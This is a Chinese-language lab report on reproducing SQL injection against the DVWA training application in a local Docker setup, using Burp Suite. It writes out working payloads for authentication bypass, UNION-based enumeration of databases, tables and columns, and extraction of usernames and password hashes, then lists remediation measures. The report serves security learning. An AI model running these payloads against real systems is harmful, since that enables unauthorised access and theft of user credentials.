# SQL 注入漏洞复现报告



# 1. 实验简介



本实验基于 DVWA（Damn Vulnerable Web Application）搭建 Web 安全测试环境，针对 SQL Injection（SQL 注入）漏洞进行手工测试与漏洞复现。



本实验主要目标：



- 理解 SQL 注入漏洞原理

- 学习 SQL Payload 构造方式

- 学习 Burp Suite 抓包与请求分析

- 学习 HTTP 请求修改与重放

- 学习数据库信息枚举

- 学习敏感数据读取方法



通过本实验，可以初步掌握 Web 安全测试中的 SQL 注入基础利用流程。



---



# 2. 实验环境



| 组件 | 说明 |
|---|---|
| 操作系统 | Windows 11 |
| 容器环境 | Docker Desktop |
| 漏洞靶场 | DVWA |
| 数据库 | MySQL / MariaDB |
| 抓包工具 | Burp Suite Community Edition |
| 浏览器 | Google Chrome |



---



# 3. DVWA 环境搭建



## 3.1 启动 DVWA



进入 DVWA 项目目录后，执行：



```bash

docker compose up -d

```



启动完成后，使用以下命令查看容器状态：



```bash

docker ps

```



确认 DVWA 容器已经正常运行。



浏览器访问：



```text

http://localhost:4280

```



进入 DVWA 页面。



---



## 3.2 初始化数据库



首次进入 DVWA 后，需要点击：



```text

Create / Reset Database

```



完成数据库初始化。



---



## 3.3 修改安全等级



进入：



```text

DVWA Security

```



将安全等级修改为：



```text

Low

```



该等级下不会对用户输入进行严格过滤，方便进行 SQL 注入测试。



---



# 4. SQL 注入基础验证



进入：



```text

SQL Injection

```



输入：



```sql

1

```



页面会返回 id=1 对应的用户信息。



随后输入：



```sql

1' OR '1'='1

```



页面返回所有用户信息。



说明 SQL 注入成功。



---



# 5. SQL 注入原理分析



后台原始 SQL 语句类似于：



```sql

SELECT first_name, last_name

FROM users

WHERE user_id = '$id';

```



当输入：



```sql

1' OR '1'='1

```



后，SQL 语句变为：



```sql

SELECT first_name, last_name

FROM users

WHERE user_id = '1' OR '1'='1';

```



由于：



```sql

'1'='1'

```



恒为 TRUE，因此 WHERE 条件永远成立，数据库会返回所有数据。



这就是经典 SQL 注入漏洞原理。



---



# 6. Burp Suite 抓包分析



## 6.1 开启 Burp 抓包



打开 Burp Suite：



```text

Proxy -> Intercept

```



开启拦截功能。



浏览器访问 SQL Injection 页面后，Burp 成功抓取 HTTP 请求。



---



## 6.2 HTTP 请求分析



抓取到的请求类似：



```http

GET /vulnerabilities/sqli/?id=1%27OR%271%27=%271 HTTP/1.1

Host: localhost:4280

Cookie: security=low

```



可观察到：



- 请求方法为 GET

- 漏洞参数为 id

- Payload 已进行 URL 编码

- 请求中包含 Cookie 信息

- security=low 表示当前安全等级为 low



通过 Burp 可以清晰观察 Web 请求结构。



---



# 7. Repeater 手工测试



将抓取到的请求发送到：



```text

Repeater

```



用于手工修改 Payload。



---



## 7.1 测试基础注入



Payload：



```sql

1' OR '1'='1

```



点击：



```text

Send

```



在 Response 中成功看到所有用户信息。



说明 SQL 注入漏洞存在。



---



# 8. 判断字段数



为了后续 UNION 注入，需要先确定查询字段数量。



测试 Payload：



```sql

1' ORDER BY 1#

1' ORDER BY 2#

1' ORDER BY 3#

```



测试结果：



| Payload | 结果 |
|---|---|
| ORDER BY 1 | 正常 |
| ORDER BY 2 | 正常 |
| ORDER BY 3 | 报错 |



说明：



```text

当前查询字段数为 2

```



---



# 9. UNION SELECT 联合查询测试



Payload：



```sql

1' UNION SELECT 1,2#

```



页面返回：



```text

First name: 1

Surname: 2

```



说明：



- UNION SELECT 成功执行

- 两个字段均可回显

- SQL 注入可进一步利用



---



# 10. 数据库信息枚举



## 10.1 获取数据库名与数据库用户



Payload：



```sql

1' UNION SELECT database(),user()#

```



成功获取：



- 当前数据库名

- 当前数据库用户



---



## 10.2 获取数据库版本



Payload：



```sql

1' UNION SELECT version(),2#

```



成功获取数据库版本信息。



---



## 10.3 获取操作系统信息



Payload：



```sql

1' UNION SELECT @@version_compile_os,2#

```



成功获取数据库服务器操作系统信息。



---



# 11. 数据库枚举



## 11.1 爆表



Payload：



```sql

1' UNION SELECT table_name,2 FROM information_schema.tables#

```



成功读取数据库中的所有表名。



---



## 11.2 爆字段



Payload：



```sql

1' UNION SELECT column_name,2 FROM information_schema.columns#

```



成功读取数据库字段名。



---



# 12. 敏感数据读取



Payload：



```sql

1' UNION SELECT user,password FROM users#

```



成功读取：



- 用户名

- 密码 Hash



说明攻击者已经能够直接获取数据库中的敏感信息。



---



# 13. 漏洞危害分析



SQL 注入漏洞可能导致：



- 数据库信息泄露

- 用户敏感数据泄露

- 登录绕过

- 管理员权限获取

- 数据篡改

- 服务器被进一步攻击



属于高危 Web 漏洞。



---



# 14. 漏洞修复方案



为防止 SQL 注入漏洞，应采取以下措施：



## 14.1 使用预编译语句



使用：



```text

Prepared Statement

```



避免 SQL 拼接。



---



## 14.2 参数化查询



禁止将用户输入直接拼接到 SQL 语句中。



---



## 14.3 输入过滤



对特殊字符进行过滤：



```text

'

"

#

--

;

```



---



## 14.4 最小权限原则



数据库账户不应拥有过高权限。



---



## 14.5 使用 WAF



部署 Web Application Firewall 对恶意请求进行拦截。



---



# 15. 实验总结



本实验成功复现了 DVWA 中的 SQL 注入漏洞。



实验过程中完成了：



- Docker 环境搭建

- DVWA 配置

- Burp Suite 抓包

- SQL Payload 构造

- HTTP 请求分析

- UNION 联合查询

- 数据库信息枚举

- 敏感数据读取



通过本实验，进一步理解了 SQL 注入漏洞的利用流程以及 Web 安全测试基础方法，为后续学习 Web 渗透测试打下了基础。



